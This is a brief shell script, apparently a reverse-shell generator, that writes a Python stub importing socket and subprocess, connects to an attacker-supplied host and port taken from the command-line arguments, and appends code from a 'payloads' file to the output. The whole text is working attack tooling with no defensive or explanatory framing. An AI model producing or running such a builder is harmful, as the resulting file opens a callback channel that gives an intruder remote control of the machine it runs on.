echo "import socket
import subprocess
import os
import time
import sys

s = socket.socket()
s.connect(('$1', int('$2')))" > $3
cat payloads >> $3